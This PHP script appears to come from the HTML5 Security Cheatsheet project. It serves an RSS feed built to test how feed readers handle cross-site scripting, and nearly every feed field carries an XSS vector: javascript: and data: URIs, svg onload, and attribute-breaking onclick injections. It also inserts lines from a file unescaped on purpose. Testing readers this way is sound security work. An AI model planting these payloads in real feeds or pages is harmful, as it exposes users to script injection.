<?php
if(array_key_exists('addtime', $_GET))
{
	header('Content-Type: text/plain');
	if(strlen($_GET['addtime']) <= 1)
		echo time() + 300;
	else
		echo time() + intval(substr($_GET['addtime'], 1));
}
else if(time() < $_GET['unixtime'])
{
	header('Content-Type: application/rss+xml; charset=UTF-8');
	echo <<<EOT
<rss version="2.0">
<channel>
<title>HTML5 Security Cheatsheet++ for RSS</title>
<link>https://html5sec.org/rss/</link>
<description>What your feedreader does when you..</description>
</channel>
</rss>
EOT;
}
else
{
header('Content-Type: application/rss+xml; charset=UTF-8');
echo <<<EOT
<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" media="screen" href="http://html5sec.org/test.xsl"?>
<rss 
    xmlns:content="http://purl.org/rss/1.0/modules/content/" 
    xmlns:wfw="http://wellformedweb.org/CommentAPI/" 
    xmlns:dc="http://purl.org/dc/elements/1.1/" 
    xmlns:atom="http://www.w3.org/2005/Atom" 
    xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
    xmlns:slash="http://purl.org/rss/1.0/modules/slash/" 
    xmlns:georss="http://www.georss.org/georss" 
    xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#" 
    xmlns:media="http://search.yahoo.com/mrss/" 
    xmlns:feedburner="http://rssnamespace.org/feedburner/ext/1.0" 
    version="2.0"
>
<channel>
	<title>HTML5 Security Cheatsheet++ for RSS</title>
	<link>http://foo.com/?"onclick=prompt(1)/</link>
	<description><![CDATA[What your feedreader does when you.. <svg onload=alert(/description/)>]]></description>
	<language>en</language>
	<generator><![CDATA[<s>000</s>javascript:alert(1)]]></generator>
	<image>
		<url>http://html5sec.org/test.svg</url>
		<title>XSS Test-Vectors</title>
		<link>data:x,%3cscript%3ealert(/link/)%3c/script%3e</link>
	</image>
EOT;
$handle = @fopen('rss.txt', 'r');
if ($handle) {
	$counter = 1;
    while (($buffer = fgets($handle, 4096)) !== false) {
    $buffer = preg_replace('/alert\(\d\)/', 'alert('.$counter.')', $buffer);    	
    $encbuffer = htmlentities($buffer, ENT_QUOTES, 'UTF-8');
echo <<<EOT
	<item>
		<title><![CDATA[Vector $counter - "'`>$buffer]]></title>
		<link>data:x,%3cscript%3ealert(/link/)%3c/script%3e</link>
		<comments>javascript:prompt($counter)</comments>
		<pubDate><![CDATA[<iframe src=javascript:prompt(/pubdate/)>]]></pubDate>
		<dc:creator><![CDATA[$buffer]]></dc:creator>
		<guid isPermaLink="false">data:x,%3cscript%3ealert(/guid/)%3c/script%3e</guid>
        <enclosure url="http://html5sec.org/test.svg" type="image/svg+xml" />
        <enclosure url="http://html5sec.org/rss/" type="text/html" />
        <link rel="enclosure" type="image/svg+xms" href="http://heideri.ch/test.svg?'onclick=alert(/link-enclosure/)//" />
		<description><![CDATA[
			$buffer
            "'`>$encbuffer
		]]></description>
	    <content:encoded><![CDATA[
	    	$buffer
            "'`>$encbuffer
	    ]]></content:encoded>
        <media:thumbnail url="http://html5sec.org/test.svg?'onclick=alert(/media:thumbnail/)//" />
		<media:content url='http://html5sec.org/test.svg?"onclick=alert(/media:content/)//' medium="image">
			<media:title type="html"><![CDATA[$buffer]]></media:title>
		</media:content>
	<feedburner:origLink>data:x,%3cscript%3ealert(/origLink/)%3c/script%3e</feedburner:origLink>
	</item>
EOT;
	$counter++;
    }
    fclose($handle);
}

echo '</channel>
</rss>';
} //else
?>
